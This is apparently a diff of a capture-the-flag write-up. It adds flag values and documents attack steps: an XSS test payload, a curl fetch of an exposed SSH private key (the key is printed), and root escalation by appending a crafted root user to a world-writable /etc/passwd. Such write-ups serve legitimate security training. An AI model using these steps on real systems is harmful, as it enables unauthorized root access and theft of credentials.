@@ -5,6 +5,8 @@
 
 **Flags**:
  - 1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
+ - 2 of 3 Magaluf! : 6Bj*9-sp&R
+ - 3 of 3 I am Groot : C3f#7-LsRNn^U78-
 
 ## 1. Setup and Approach
 
@@ -205,7 +207,6 @@ Uploading a `<script>alert(document.domain)</script>` confirms it can render js,
 - **Using the Private Key**:
    ```
    curl http://13.40.110.252/portfolio_one-page-template/.ssh/id_ed25519
-   
   -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYwAAAJij6Mx/o+jM
@@ -234,29 +235,27 @@ Uploading a `<script>alert(document.domain)</script>` confirms it can render js,
     uid=1001(BillyTheKid) gid=1001(BillyTheKid) groups=1001(BillyTheKid),100(users)
     uid=1002(Magaluf2012) gid=1002(Magaluf2012) groups=1002(Magaluf2012),100(users)
     ```
-      Magaluf2012, uid 1002, another user and potential target.
+     - **Notes**: Magaluf2012, another user and potential target.
 
-- **Bash History**:  
-     ```
-		 su root BillyTheKid1994
-		 history
-		 cd
-		 ssh-keygen -t ed25519
-		 sudo ssh-keygen -t ed25519
-		history
-		 su root BillyTheKid1994
-		 history
-		 adduser Maggers!
-		 history
-		apt install vsftpd
-		 I'm a Ninja!
-		 Super Ninja!
-		 history
-		 sudo -l
-		 su root
-		 ls
-		 cat Message_from_your_friendly_neighbourhood_root
-		 history
-		 su Magaluf2012
-		 ```
+- **/etc/passwd** I am unsure if this was intended to be writable.
+	```
+	ls -la /etc/passwd
+	-rwxrwxrwx 1 root root 2017 Jul  2  2024 /etc/passwd
+	```
+	```
+	openssl passwd -1 -salt sad sad
+	echo 'haxor:$1$sad$.7dpkEM4DAn0Cz0Rp8Aha1:0:0::/root:/bin/bash' >> /etc/passwd
+	su haxor
+	root@ip-172-31-14-224:~# whoami
+	root
+
+	root@ip-172-31-14-224:~# cat Flag_3
+	3 of 3 I am Groot : C3f#7-LsRNn^U78-
+
+	root@ip-172-31-14-224:~# cat /home/Magaluf2012/Flag_2
+	2 of 3 Magaluf! : 6Bj*9-sp&R
+
+	```
+ 
+
 		 
